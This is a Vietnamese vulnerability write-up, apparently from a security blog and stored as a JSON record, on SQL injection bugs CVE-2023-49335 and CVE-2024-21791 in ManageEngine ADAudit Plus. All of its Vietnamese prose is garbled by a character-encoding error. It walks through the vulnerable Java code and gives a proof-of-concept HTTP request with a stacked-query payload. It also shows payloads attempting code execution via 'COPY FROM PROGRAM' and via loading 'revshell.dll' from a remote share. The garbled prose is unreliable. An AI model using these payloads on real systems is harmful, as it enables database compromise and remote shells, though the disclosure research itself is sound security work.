[{"content":"Chuyá»‡n lÃ¢u rá»“i giá» má»›i ká»ƒ lÃ  dáº¡o gáº§n Ä‘Ã¢y mÃ¬nh cÃ³ dá»‹p Ä‘Æ°á»£c nghiÃªn cá»©u vá» cÃ¡c sáº£n pháº©m open-source vÃ  target láº§n nÃ y mÃ¬nh chá»n Ä‘Ã³ lÃ  ManageEngine Adaudit Plus, má»™t sáº£n pháº©m cá»§a Zoho.\nTrÆ°á»›c Ä‘Ã³ product nÃ y cÅ©ng cÃ³ nhiá»u CVE nghiÃªm trá»ng rá»“i nhÆ°ng may máº¯n thay lÃ  láº§n nÃ y sau má»™t thá»i gian audit mÃ£ nguá»“n thÃ¬ mÃ¬nh váº«n tÃ¬m Ä‘Æ°á»£c má»™t sá»‘ lá»— há»•ng nghiÃªm trá»ng khÃ¡c Ä‘ang cÃ²n tá»“n Ä‘á»ng trÃªn á»©ng dá»¥ng nÃ y, nÃªn mÃ¬nh viáº¿t bÃ i nÃ y Ä‘á»ƒ chia sáº» má»™t sá»‘ thá»© vá» chÃºng vÃ  cÅ©ng mong muá»‘n ráº±ng Ä‘Ã¢y cÃ³ thá»ƒ lÃ  má»™t pháº§n tÃ i liá»‡u cho nhá»¯ng ai sáº¯p hoáº·c Ä‘ang cÃ³ Ã½ Ä‘á»‹nh nghiÃªn cá»©u vá» nhá»¯ng products cá»§a ZOHO.\nManageEngine ADAudit Plus lÃ  má»™t giáº£i phÃ¡p giÃ¡m sÃ¡t vÃ  bÃ¡o cÃ¡o hoáº¡t Ä‘á»™ng Active Directory toÃ n diá»‡n, cung cáº¥p bá»Ÿi ManageEngine. ÄÃ¢y lÃ  má»™t cÃ´ng cá»¥ quan trá»ng cho viá»‡c Ä‘áº£m báº£o tuÃ¢n thá»§ quy Ä‘á»‹nh, báº£o máº­t dá»¯ liá»‡u vÃ  quáº£n lÃ½ hiá»‡u suáº¥t há»‡ thá»‘ng ( theo Chat-GPT =]]] ).\n#Effected version Zoho ManageEngine Adaudit Plus 7.2.0 Build 7250\n#Remote debug Äá»ƒ thá»±c hiá»‡n viá»‡c remote debug thÃ¬ Ä‘iá»u tiÃªn ta cáº§n extract háº¿t cÃ¡c libs cÃ³ trong thÆ° má»¥c cÃ i Ä‘áº·t:\nfind . -type f -iname *.jar -exec cp {} adap_jars/ \\; Theo cÃ¡ nhÃ¢n mÃ¬nh Ä‘á»ƒ remote debug thÃ¬ chá»‰ cáº§n sá»­a láº¡i file /bin/run.bat tá»« if \u0026quot;%1\u0026quot; == \u0026quot;debug\u0026quot; thÃ nh if \u0026quot;debug\u0026quot; == \u0026quot;debug\u0026quot; lÃ  Ä‘Æ°á»£c =))))\n#Route handling TrÆ°á»›c khi phÃ¢n tÃ­ch sÃ¢u vÃ o lá»— há»•ng thÃ¬ mÃ¬nh sáº½ nÃ³i sÆ¡ qua má»™t chÃºt vá» URL Mapping trÃªn cÃ¡c á»©ng dá»¥ng ManageEngine.\nNhÆ° bao cÃ¡c á»©ng dá»¥ng Java Web khÃ¡c, cÃ¡c url pattern vÃ  cÃ¡c filters Ä‘á»u Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a á»Ÿ cÃ¡c file .xml. VÃ­ dá»¥ nhÆ° web.xml file, cÃ³ thá»ƒ cho ta biáº¿t Ä‘Æ°á»£c má»™t endpoint sáº½ Ä‘Æ°á»£c handle bá»Ÿi má»™t class tÆ°Æ¡ng á»©ng nÃ o Ä‘Ã³ hoáº·c pháº£i Ä‘i qua nhá»¯ng filter chain nÃ o, â€¦\nVÃ­ dá»¥ nhÆ° file /webapps/adap/WEB-INF/web.xml Ä‘á»‹nh nghÄ©a nhÆ° sau:\nâ€¦ \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;ADSMServerStatusServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.adventnet.sym.adsm.servlet.ADSMServerStatusServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; â€¦ \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;ADSMServerStatusServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/servlet/ADSMServerStatus\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; â€¦ Äiá»u nÃ y Ä‘Æ°á»£c hiá»ƒu Ä‘Æ¡n giáº£n ráº±ng /servlet/ADSMServerStatus endpoint Ä‘Æ°á»£c handle bá»Ÿi class com.adventnet.sym.adsm.servlet.ADSMServerStatusServlet.\nNgoÃ i ra, má»™t Ä‘iá»u khÃ´ng kÃ©m pháº§n quan trá»ng ná»¯a ráº±ng á»Ÿ file /webapps/adap/WEB-INF/security/security.xml cho ta biáº¿t Ä‘Æ°á»£c ráº±ng request Ä‘áº¿n má»™t api endpoint sáº½ cáº§n nhá»¯ng tham sá»‘ nÃ o, gá»i báº±ng http method nÃ o, cÃ³ cáº§n csrf token hay khÃ´ng, â€¦\nâ€¦ \u0026lt;url path=\u0026#34;/api/json/fileanalysis/getFileAnalysisReportIds\u0026#34; dynamic-params=\u0026#34;false\u0026#34; csrf=\u0026#34;true\u0026#34; method=\u0026#34;post\u0026#34;/\u0026gt; \u0026lt;url path=\u0026#34;/api/json/fileanalysis/getFileServers\u0026#34; dynamic-params=\u0026#34;false\u0026#34; csrf=\u0026#34;true\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;param name=\u0026#34;JSONString\u0026#34; type=\u0026#34;JSONObject\u0026#34; max-len=\u0026#34;-1\u0026#34; template=\u0026#34;FileAnalysisServerJSON\u0026#34;/\u0026gt; \u0026lt;/url\u0026gt; â€¦ NgoÃ i ra, á»Ÿ class RestAPIHandler cÃ³ má»™t thuá»™c tÃ­nh khÃ¡ hay ho Ä‘Ã³ lÃ  apiMapping, thuá»™c tÃ­nh nÃ y bao gá»“m danh sÃ¡ch chi tiáº¿t cÃ¡c api endpoint cÃ³ thá»ƒ xá»­ lÃ½ vÃ  bÃªn trong Ä‘Ã³ thá»ƒ hiá»‡n chi tiáº¿t cáº£ class láº«n method Ä‘á»ƒ handle api endpoint Ä‘Ã³.\nNgoÃ i ra cÃ²n má»™t sá»‘ file khÃ¡c ná»¯a nhÆ° conf/adap/rest-api.xml, conf/adap/restapi-client-conf.xml, conf/FileAnalysis/restapi.xml,â€¦ nhÆ°ng Ä‘á»‘i vá»›i mÃ¬nh thÆ°á»ng cÃ¡ch tá»‘t nháº¥t Ä‘á»ƒ tÃ¬m má»™t method nÃ o Ä‘Ã³ cÃ³ Ä‘Æ°á»£c call trá»±c tiáº¿p thÃ´ng qua endpoint nÃ o hay khÃ´ng báº±ng cÃ¡ch lÃ  extract háº¿t táº¥t cáº£ cÃ¡c file .xml ra má»™t folder, thá»±c hiá»‡n search vÃ  trace trá»±c tiáº¿p.\n#CVE-2023-49335 Lá»— há»•ng xuáº¥t hiá»‡n á»Ÿ chá»©c nÄƒng getFileServers táº¡i class com.adventnet.sym.adsm.auditing.webclient.ember.api.fileanalysis.FileAnalysisHandler, ta tháº¥y ráº±ng á»Ÿ conf/FileAnalysis/restapi.xml Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a nhÆ° sau:\n... \u0026lt;ADAPRestApiMapping UNIQUE_ID=\u0026#34;ADAPRestApiMapping:UNIQUE_ID:763\u0026#34; TAB_NAME=\u0026#34;fileAnalysis\u0026#34; URL_PATH=\u0026#34;/fileanalysis/getFileServers\u0026#34; CLASS_NAME=\u0026#34;com.adventnet.sym.adsm.auditing.webclient.ember.api.fileanalysis.FileAnalysisHandler\u0026#34; METHOD_NAME=\u0026#34;getFileServers\u0026#34; DESCRIPTION=\u0026#34;Get Configured File Servers\u0026#34; /\u0026gt; ... thÃ¬ Ä‘á»ƒ call Ä‘Æ°á»£c getFileServers method thÃ¬ restapi endpoint cÃ³ url path lÃ  /fileanalysis/getFileServers. ThÆ°á»ng cÃ¡c restapi sáº½ cÃ³ prefix lÃ  /api/json hoáº·c /api/xml\nsau Ä‘Ã³ sáº½ Ä‘Æ°á»£c RestAPIHandler xoÃ¡ pháº§n prefix vÃ  pháº§n cÃ²n láº¡i cá»§a url sáº½ Ä‘Æ°á»£c dÃ² trong apiMapping Ä‘Ã£ nÃ³i nhÆ° á»Ÿ bÃªn trÃªn.\nTÃ³m láº¡i lÃ  request Ä‘áº¿n /api/json/fileanalysis/getFileServers Ä‘á»ƒ call chá»©c nÄƒng com.adventnet.sym.adsm.auditing.webclient.ember.api.fileanalysis.FileAnalysisHandler:getFileServers().\nVá» pháº§n hÃ m getFileServers():\npublic void getFileServers(HttpServletRequest request, HttpServletResponse response) throws Exception { JSONObject reqData = new JSONObject(request.getParameter(\u0026#34;JSONString\u0026#34;)); JSONObject serverInputParams = reqData.getJSONObject(\u0026#34;inputParams\u0026#34;); // ... HashMap\u0026lt;String, Object\u0026gt; returnListMap = getFileServers(serverInputParams, domainName, rb); // ... } CÆ¡ báº£n chá»• nÃ y chÆ°Æ¡ng trÃ¬nh sáº½ láº¥y untrust data tá»« tham sá»‘ JSONString dÆ°á»›i dáº¡ng json tá»« user vÃ  sau Ä‘Ã³ tiáº¿p tá»¥c láº¥y tá»« JSONString má»™t json object khÃ¡c tá»« thuá»™c tÃ­nh inputParams, dá»¯ liá»‡u nÃ y sáº½ Ä‘Æ°á»£c Ä‘áº·t vÃ o hÃ m static getFileServers() xá»­ lÃ½ tiáº¿p.\nprivate static HashMap\u0026lt;String, Object\u0026gt; getFileServers(JSONObject serverInputParams, String domainName, AdventNetResourceBundle rb) { HashMap\u0026lt;String, Object\u0026gt; returnListMap = new HashMap(); try { String uvhString = \u0026#34;AUDCVConfig:cv_id:200100\u0026#34;; serverInputParams.put(\u0026#34;serverType\u0026#34;, \u0026#34;fs\u0026#34;); ... long count = FileAnalysisServerHandler.getConfiguredServersCount(serverInputParams, domainName); // ... tiáº¿p theo, Ä‘áº·t input tiáº¿p tá»¥c vÃ o hÃ m FileAnalysisServerHandler.getConfiguredServersCount()\npublic static long getConfiguredServersCount(JSONObject serverInputParams, String domainName) { long count = 0L; try { JSONObject searchData = serverInputParams.optJSONObject(\u0026#34;searchData\u0026#34;); String searchCriteria = null; if (searchData != null) { searchCriteria = \u0026#34;ADSMComputerGeneralDetails.NAME LIKE \u0026#39;%\u0026#34; + searchData.optString(\u0026#34;NAME\u0026#34;, \u0026#34;\u0026#34;) + \u0026#34;%\u0026#39;\u0026#34;; } count = (long)getCount(domainName, searchCriteria); // ... } Lá»— há»•ng SQL injection xuáº¥t hiá»‡n khÃ¡ lÃ  cÆ¡ báº£n táº¡i Ä‘Ã¢y khi ta cÃ³ thá»ƒ hoÃ n toÃ n Ä‘iá»u chá»‰nh Ä‘Æ°á»£c pháº§n Ä‘iá»u kiá»‡n thÃ´ng qua biáº¿n searchCriteria báº±ng viá»‡c cá»™ng chuá»—i vá»›i giÃ¡ trá»‹ tá»« trÆ°á»ng NAME Ä‘Æ°á»£c láº¥y tá»« serverInputParams. VÃ  biáº¿n searchCriteria sáº½ Ä‘Æ°á»£c Ä‘áº·t tiáº¿p vÃ o hÃ m static getCount()\nprivate static int getCount(String domainName, String searchCriteria) { int rowsCount = 0; try { long cvId = DBObjectUtil.getUVHValues(\u0026#34;AUDCVConfig\u0026#34;, \u0026#34;AUDCVConfig:cv_id:200201\u0026#34;); HashMap\u0026lt;String, String\u0026gt; hashMap = new HashMap(); hashMap.put(\u0026#34;DOMAIN_NAME\u0026#34;, domainName); String queryStr = ADAPSQLQueryAPI.getInstance().getSQLCountString(cvId, searchCriteria, hashMap); rowsCount = QueryUtil.getRowsCount(queryStr); // ... } HÃ m ADAPSQLQueryAPI.getInstance().getSQLCountString() cÃ³ nhiá»‡m vá»¥ lÃ  construct má»™t sql query tá»« cÃ¡c params Ä‘áº§u vÃ o Ä‘á»ƒ táº¡o thÃ nh má»™t cÃ¢u truy váº¥n hoÃ n chá»‰nh, sau Ä‘Ã³ Ä‘áº·t vÃ o hÃ m QueryUtil.getRowsCount() Ä‘á»ƒ thá»±c thi.\nCall stack:\ncom.adventnet.sym.adsm.common.server.sql.QueryUtil::getRowsCount() com.adventnet.sym.adsm.auditing.server.fileanalysis.FileAnalysisServerHandler::getCount() com.adventnet.sym.adsm.auditing.server.fileanalysis.FileAnalysisServerHandler::getConfiguredServersCount() com.adventnet.sym.adsm.auditing.webclient.ember.api.fileanalysis.FileAnalysisHandler::getFileServers() [private static] com.adventnet.sym.adsm.auditing.webclient.ember.api.fileanalysis.FileAnalysisHandler::getFileServers() [plubic void] ... #CVE-2024-21791 TrÃªn lÃ  má»™t lá»— há»•ng SQL injection tÆ°Æ¡ng Ä‘á»‘i dá»… tháº¥y vÃ  cÆ¡ báº£n khi review source code, cÃ²n vá» CVE-2024-21791 thÃ¬ cÃ¡ch tiáº¿p cáº­n cá»§a mÃ¬nh khi tÃ¬m ra bug nÃ y thÃ¬ vá» cÆ¡ báº£n váº«n nhÆ° bug trÆ°á»›c, nghÄ©a lÃ  váº«n theo dÃµi flow-code, tÃ¬m ra cÃ¡c sink rá»“i trace ngÆ°á»£c vá» tÃ¬m source. NhÆ°ng Ä‘Ã¡ng chÃº Ã½ lÃ  á»Ÿ pháº§n nÃ y mÃ¬nh Ä‘Ã£ bá» qua nhiá»u láº§n khi review source-code vÃ¬ cá»© ngá»¡ ráº±ng khÃ´ng thá»ƒ bypass, cÅ©ng may máº¯n lÃ  mÃ¬nh Ä‘Ã£ quyáº¿t Ä‘á»‹nh Ä‘i sÃ¢u vÃ o phÃ¢n tÃ­ch thÃ¬ nháº­n ra cÃ³ má»™t lá»— há»•ng trong hÃ m filter input, hÃ m nÃ y Ä‘Æ°á»£c thiáº¿t káº¿ Ä‘á»ƒ phÃ²ng trÃ¡nh sql injection.\nRoot cause cá»§a lá»— há»•ng nÃ y lÃ  sá»± nháº§m láº«n trong quÃ¡ trÃ¬nh biáº¿n Ä‘á»•i input lá»“ng nhau giá»¯a hai hÃ m CommonUtil.getSearchString() vÃ  hÃ m ReportHandlerUtil.getSearchString(). Cá»¥ thá»ƒ nhÆ° sau:\nHÃ m CommonUtil.getSearchString():\n// class CommonUtil public static String getSearchString(String value, Boolean escape) throws Exception { if (escape) { value = EscapeUtil.escSplCharsAsSQLForLike(value); } int len = value.length(); if (len != 1 \u0026amp;\u0026amp; (value.charAt(0) != \u0026#39;\\\\\u0026#39; || len != 2)) { if (value.charAt(0) == \u0026#39;*\u0026#39; \u0026amp;\u0026amp; value.charAt(len - 1) == \u0026#39;*\u0026#39;) { value = value.substring(1, len - 1); value = \u0026#34;%\u0026#34; + value + \u0026#34;%\u0026#34;; } else if (value.charAt(len - 1) == \u0026#39;*\u0026#39;) { value = value.substring(0, len - 1); value = value + \u0026#34;%\u0026#34;; } else if (value.charAt(len - 1) == \u0026#39;%\u0026#39;) { value = value.substring(0, len - 1); value = value + \u0026#34;%\u0026#34;; } else if (value.charAt(0) == \u0026#39;*\u0026#39;) { value = value.substring(1, len); value = \u0026#34;%\u0026#34; + value; } else { value = \u0026#34;%\u0026#34; + value + \u0026#34;%\u0026#34;; } } else { value = \u0026#34;%\u0026#34; + value + \u0026#34;%\u0026#34;; } return value; } chá»§ yáº¿u thá»±c hiá»‡n vÃ´ hiá»‡u hÃ³a cÃ¡c kÃ½ tá»± Ä‘áº·c biá»‡t (special chars) cá»§a input náº¿u escape=True báº±ng hÃ m EscapeUtil.escSplCharsAsSQLForLike() vÃ  Ä‘á»“ng thá»i format láº¡i input dÆ°á»›i dáº¡ng %â€¦%, bá»Ÿi vÃ¬ Ä‘Ã¢y lÃ  dá»¯ liá»‡u dÃ¹ng Ä‘á»ƒ tÃ¬m kiáº¿m á»Ÿ where clause nÃªn thÆ°á»ng Ä‘áº·t bÃªn trong cáº·p dáº¥u %%\nVÃ  hÃ m ReportHandlerUtil.getSearchString():\n// class ReportHandlerUtil public String getSearchString(String columnName, String val, String dataType) { if (dataType == null) { return columnName + \u0026#34; LIKE \u0026#39;\u0026#34; + val + \u0026#34;\u0026#39;\u0026#34;; } else if (dataType.toLowerCase().indexOf(\u0026#34;char\u0026#34;) != -1) { return columnName + \u0026#34; LIKE \u0026#39;\u0026#34; + val + \u0026#34;\u0026#39;\u0026#34;; } else { val = val.replaceAll(\u0026#34;%\u0026#34;, \u0026#34;\u0026#34;); return columnName + \u0026#34; = \u0026#34; + val; } } thá»±c hiá»‡n hoÃ n chá»‰nh LIKE clause, á»Ÿ Ä‘Ã¢y ta chÃº Ã½ ráº±ng náº¿u kiá»ƒu dá»¯ liá»‡u cá»§a columnName lÃ  má»™t trong hai dáº¡ng lÃ  null hoáº·c dáº¡ng báº¥t ká»³ cá»§a kiá»ƒu char thÃ¬ value sáº½ Ä‘Æ°á»£c Ä‘áº·t vÃ o trong cáº·p dáº¥u nhÃ¡y Ä‘Æ¡n (â€˜), cÃ²n láº¡i thÃ¬ khÃ´ng.\nContext cÆ¡ báº£n lÃ  nhÆ° sau:\nString search_value = input[0]; String column_name = input[1]; String searchCriteria = \u0026#34;\u0026#34;; String column_data_type = getColumnDataType(column_name); searchCriteria = ReportHandlerUtil.getSearchString(column_name, CommonUtil.getSearchString(search_value, true), column_data_type); String query = \u0026#34;SELECT * FROM users WHERE \u0026#34; + searchCriteria Vá» cÆ¡ báº£n input Ä‘Ã£ bá»‹ escape thÃ´ng qua hÃ m EscapeUtil.escSplCharsAsSQLForLike() bÃªn trong hÃ m CommonUtil.getSearchString() vÃ¬ tháº¿ nÃªn má»™t sá»‘ kÃ½ tá»± nhÆ° dáº¥u nhÃ¡y Ä‘Æ¡n (â€˜), dáº¥u nhÃ¡y kÃ©p (â€œ), dáº¥u backslash (), â€¦ Ä‘á»u khÃ´ng sá»­ dá»¥ng Ä‘Æ°á»£c.\nCho nÃªn váº¥n Ä‘á» á»Ÿ Ä‘Ã¢y lÃ , náº¿u ta tÃ¬m Ä‘Æ°á»£c má»™t columnName cÃ³ kiá»ƒu dá»¯ liá»‡u khÃ¡c null vÃ  char (cháº³ng háº¡n nhÆ° int) thÃ¬ value sáº½ khÃ´ng bá»‹ nhá»‘t trong cáº·p dáº¥u nhÃ¡y Ä‘Æ¡n (â€˜) vÃ  dáº«n Ä‘áº¿n cÃ³ thá»ƒ bypass sql injection.\nExample:\nString search_value = \u0026#34;*1337 and sleep(3)*\u0026#34;; String searchCriteria = \u0026#34;\u0026#34;; searchCriteria = CommonUtil.getSearchString(search_value, true) // Output =\u0026gt; %1337 and sleep(3)% String column_name = \u0026#34;id\u0026#34;; String column_data_type = getColumnDataType(column_name); // Output =\u0026gt; column_data_type = \u0026#34;INT\u0026#34; searchCriteria = ReportHandlerUtil.getSearchString(column_name, searchCriteria, column_data_type); // Output =\u0026gt; searchCriteria = \u0026#34;id = 1337 and sleep(3)\u0026#34; String query = \u0026#34;SELECT * FROM users WHERE \u0026#34; + searchCriteria // Output =\u0026gt; query = \u0026#34;SELECT * FROM users WHERE id = 1337 and sleep(3)\u0026#34; Lá»— há»•ng nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c trigger thÃ´ng qua /api/json/report/getLockoutHistoryData endpoint, lÃºc nÃ y sáº½ gá»i hÃ m getLockoutHistoryData() cá»§a class com.adventnet.sym.adsm.auditing.webclient.ember.api.report.SubReportHandler nhÆ° sau:\npublic void getLockoutHistoryData(HttpServletRequest request, HttpServletResponse response) throws Exception { try { // ... JSONObject reportReqData = new JSONObject(request.getParameter(\u0026#34;JSONString\u0026#34;)); JSONObject reportInputParams = reportReqData.getJSONObject(\u0026#34;inputParams\u0026#34;); // ... Long reportId = reportReqData.getLong(\u0026#34;reportId\u0026#34;); // ... String tabType = reportInputParams.getString(\u0026#34;tabType\u0026#34;); // ... if (tabType.equalsIgnoreCase(\u0026#34;ws\u0026#34;)) { // ... } else if (tabType.equalsIgnoreCase(\u0026#34;dc\u0026#34;)) { // ... columnList = ReportUtil.getInstance().getVisibleColumnList(reportcvId, true, true, false, (String)null, (String)null, rb); (1) String searchCriteria = ReportHandler.getInstance().getSearchCriteria(reportInputParams, columnList, true); (2) // ... } NÃ´m na lÃ  hÃ m nÃ y nháº­n inputParams tá»« JSON object Ä‘Æ°á»£c parse tá»« JSONString bÃªn trong request body, cÃ³ hai tham sá»‘ cáº§n lÆ°u Ã½ lÃ  reportId vÃ  tabType, Ä‘á»ƒ trigger Ä‘Æ°á»£c lá»—i mÃ¬nh sáº½ Ä‘i vÃ o nhÃ¡nh tabType=â€dcâ€.\nTáº¡i (1), biáº¿n columnList sáº½ lÆ°u giá»¯ danh sÃ¡ch cÃ¡c tÃªn cá»™t dá»±a vÃ o tham sá»‘ reportcvId mÃ  ta truyá»n vÃ o. VÃ  (2), biáº¿n searchCriteria sáº½ chá»©a cÃ¢u Ä‘iá»u kiá»‡n mÃ  sau nÃ y sáº½ Ä‘Æ°á»£c ná»‘i trá»±c tiáº¿p vÃ o cÃ¢u truy váº¥n (nguyÃªn nhÃ¢n dáº«n Ä‘áº¿n SQL injection) Ä‘á»ƒ thá»±c hiá»‡n lá»c káº¿t quáº£ vÃ  hÃ m ReportHandler.getInstance().getSearchCriteria() nháº­n vÃ o hai tham sá»‘ ta cÃ³ thá»ƒ control Ä‘Æ°á»£c lÃ  columnList vÃ  reportInputParams. HÃ m ReportHandler.getSearchCriteria() cÆ¡ báº£n nhÆ° sau:\npublic String getSearchCriteria(JSONObject reportReqData, ArrayList\u0026lt;HashMap\u0026lt;String, Object\u0026gt;\u0026gt; tableAllColumnList, Boolean needSearchCriteria) throws Exception { // ... if (reportReqData.has(\u0026#34;searchData\u0026#34;)) { searchData = reportReqData.getJSONObject(\u0026#34;searchData\u0026#34;); (3) Iterator var6 = tableAllColumnList.iterator(); while(var6.hasNext()) { (4) HashMap\u0026lt;String, Object\u0026gt; tableconfig = (HashMap)var6.next(); columnName = tableconfig.get(\u0026#34;columnalias\u0026#34;).toString(); // ... if (searchData.has(columnName)) { String columnSearchValue = searchData.get(columnName).toString(); (5) tableconfig.put(\u0026#34;searchValue\u0026#34;, searchData.get(columnName).toString()); searchValue = null; if (tableName != null) { TableDefinition tableDefinition = MetaDataUtil.getTableDefinitionByName(tableName); if (tableDefinition != null) { ColumnDefinition columnDefinition = tableDefinition.getColumnDefinitionByName(columnName); searchValue = columnDefinition != null ? columnDefinition.getDataType() : null; (6) } } if (columnSearchValue != null \u0026amp;\u0026amp; !columnSearchValue.equalsIgnoreCase(\u0026#34;\u0026#34;)) { if (needSearchCriteria) { columnSearchValue = CommonUtil.getSearchString(columnSearchValue, true); (7) if (searchCriteria == null) { searchCriteria = new String(); } else { searchCriteria = searchCriteria + \u0026#34; AND \u0026#34;; } searchCriteria = searchCriteria + ReportHandlerUtil.getInstance().getSearchString(columnName, columnSearchValue, searchValue); (8) } else { // ... } // ... return searchCriteria; } Táº¡i:\n(3), láº¥y json object searchData tá»« reportReqData lÃ  inputParams ban Ä‘áº§u (4), thá»±c hiá»‡n loop danh sÃ¡ch cÃ¡c columns Ä‘á»ƒ construct cÃ¡c cÃ¢u Ä‘iá»u kiá»‡n sau WHERE vá»›i column value tÆ°Æ¡ng á»©ng (5), láº¥y columnValue hay nÃ³i cÃ¡ch khÃ¡c lÃ  giÃ¡ trá»‹ cá»§a column mÃ  ta muá»‘n tÃ¬m kiáº¿m (vÃ­ dá»¥: id = 1) náº¿u nhÆ° tá»“n táº¡i tÃªn column tá»« trong inputParams (6), biáº¿n searchValue sáº½ chá»©a kiá»ƒu dá»¯ liá»‡u cá»§a column tá»« columnName (7), biáº¿n columnSearchValue sáº½ chá»©a giÃ¡ trá»‹ sau khi thá»±c hiá»‡n filter cÆ¡ báº£n vÃ  format columnValue dáº¡ng LIKE clause (%â€¦%) qua hÃ m CommonUtil.getSearchString() (8), ná»‘i chuá»—i trá»±c tiáº¿p cÃ¡c Ä‘iá»u kiá»‡n vÃ  chuá»—i Ä‘iá»u kiá»‡n tráº£ vá» tá»« hÃ m ReportHandlerUtil.getInstance().getSearchString() vá»›i cÃ¡c tham sá»‘ truyá»n vÃ o lÃ  columnName, columnSearchValue vÃ  searchValue NhÆ° váº¥n Ä‘á» Ä‘Ã£ Ä‘Æ°á»£c nÃªu tá»« Ä‘áº§u bÃ i, chá»‰ cáº§n tÃ¬m Ä‘Æ°á»£c má»™t columnName cÃ³ dataType khÃ´ng pháº£i kiá»ƒu dá»¯ liá»‡u chuá»—i lÃ  cÃ³ thá»ƒ bypass, sau má»™t lÃºc lá»¥c tÃ¬m trÃªn database thÃ¬ mÃ¬nh tÃ¬m Ä‘Æ°á»£c column cÃ³ tÃªn lÃ  TIME_GENERATED cÃ³ dataType lÃ  BIGINT thoÃ£ mÃ£n Ä‘Æ°á»£c Ä‘iá»u kiá»‡n nÃ y, trace ngÆ°á»£c láº¡i má»™t lÃºc thÃ¬ tÃ¬m Ä‘Æ°á»£c reportcvId=133.\nÄáº¿n Ä‘Ã¢y thÃ¬ má»i thá»© Ä‘Ã£ Ä‘Ã¢u vÃ o Ä‘áº¥y, proof of concept:\nPOST /api/json/report/getLockoutHistoryData HTTP/1.1 Host: adap:8081 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE0RnUk641RyfmYic Content-Length: 865 Cookie: JSESSIONIDADAP=\u0026lt;session\u0026gt;; adapcsrf=\u0026lt;csrf-token\u0026gt;; JSESSIONIDADAPSSO=\u0026lt;session\u0026gt; ------WebKitFormBoundaryE0RnUk641RyfmYic Content-Disposition: form-data; name=\u0026#34;JSONString\u0026#34; {\u0026#34;domainName\u0026#34;:\u0026#34;nhienit.vn\u0026#34;, \u0026#34;machineDomainName\u0026#34;:\u0026#34;ahihi\u0026#34;, \u0026#34;reportId\u0026#34;:133, \u0026#34;cvId\u0026#34;:133, \u0026#34;inputParams\u0026#34;: {\u0026#34;workstation\u0026#34;:\u0026#34;xxx\u0026#34;,\u0026#34;searchData\u0026#34;: {\u0026#34;TIME_GENERATED\u0026#34;:\u0026#34;*1337)) as AcctLckoutChangeCount; SELECT 1337-- -*\u0026#34;},\u0026#34;timeGenerated\u0026#34;:1234,\u0026#34;accountName\u0026#34;:\u0026#34;fooooo\u0026#34;,\u0026#34;columnAlias\u0026#34;:\u0026#34;fooooo\u0026#34;, \u0026#34;machineTypeStr\u0026#34;:\u0026#34;fooooo\u0026#34;, \u0026#34;domainFlatName\u0026#34;:\u0026#34;fooooo\u0026#34;,\u0026#34;errorMessage\u0026#34;:\u0026#34;fooooo\u0026#34;, \u0026#34;isConfigured\u0026#34;:true, \u0026#34;tabType\u0026#34;:\u0026#34;dc\u0026#34;}} ------WebKitFormBoundaryE0RnUk641RyfmYic Content-Disposition: form-data; name=\u0026#34;adapcsrf\u0026#34; \u0026lt;csrf-token\u0026gt; ------WebKitFormBoundaryE0RnUk641RyfmYic-- #RCE with PostgreSQL ???? Sau khi trigger thÃ nh cÃ´ng SQL injection, mÃ¬nh nháº­n tháº¥y ráº±ng á»©ng dá»¥ng cho phÃ©p thá»±c hiá»‡n stack query, Ä‘iá»u nÃ y khiáº¿n mÃ¬nh nghÄ© Ä‘áº¿n viá»‡c tÃ¬m cÃ¡ch RCE á»©ng dá»¥ng nÃ y. Há»‡ thá»‘ng quáº£n trá»‹ cÆ¡ sá»Ÿ dá»¯ liá»‡u máº·c Ä‘á»‹nh trÃªn á»©ng dá»¥ng lÃ  PostgreSQL, nÃªn Ä‘Ã nh vá»™i test thá»­ má»™t sá»‘ cÃ¡ch trÃªn sÃ¡ch giÃ¡o khoa nhÆ°:\nSá»­ dá»¥ng COPY Ä‘á»ƒ RCE thÃ´ng qua pg_execute_server_program group\n{\u0026#34;domainName\u0026#34;:\u0026#34;foooo\u0026#34;, \u0026#34;inputParams\u0026#34;:{\u0026#34;searchData\u0026#34;:{\u0026#34;NAME\u0026#34;:\u0026#34;injectxxxxxx\u0026#39;); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM \u0026#39;calc.exe\u0026#39;;-- -\u0026#34;}}} káº¿t quáº£ thu Ä‘Æ°á»£c: vá» cÆ¡ báº£n thÃ¬ chá»‰ cÃ³ super user má»›i cÃ³ thá»ƒ thá»±c hiá»‡n Ä‘Æ°á»£c nhá»¯ng chá»©c nÄƒng Ä‘áº·c biá»‡t nÃ y, sau Ä‘Ã³ mÃ¬nh Ä‘Ã£ thá»­ thá»±c hiá»‡n cÃ¡ch khÃ¡c lÃ  load external dll:\n{\u0026#34;domainName\u0026#34;:\u0026#34;foooo\u0026#34;, \u0026#34;inputParams\u0026#34;:{\u0026#34;searchData\u0026#34;:{\u0026#34;NAME\u0026#34;:\u0026#34;injectxxxxxx\u0026#39;); CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\\\\\\\192.168.17.1\\\\share\\\\revshell.dll$$, $$connect_back$$ LANGUAGE C STRICT; SELECT remote_test($$calc.exe$$, 3);-- -\u0026#34;}}} káº¿t quáº£ cÅ©ng khÃ´ng máº¥y kháº£ quan do khÃ´ng cÃ³ quyá»n thá»±c thi ( Permission denied T_T ) mÃ¬nh cÅ©ng nghÄ© Ä‘áº¿n trÆ°á»ng há»£p táº¡o má»™t tÃ i khoáº£n cÃ³ quyá»n cao hÆ¡n nhÆ° administrator, nhÆ°ng nháº­n ra lÃ  bÃªn trong á»©ng dá»¥ng khÃ´ng cÃ³ chá»©c nÄƒng nÃ o cÃ³ thá»ƒ thá»±c thi trá»±c tiáº¿p OS command cáº£ (hoáº·c do mÃ¬nh tÃ¬m khÃ´ng tháº¥y =]] 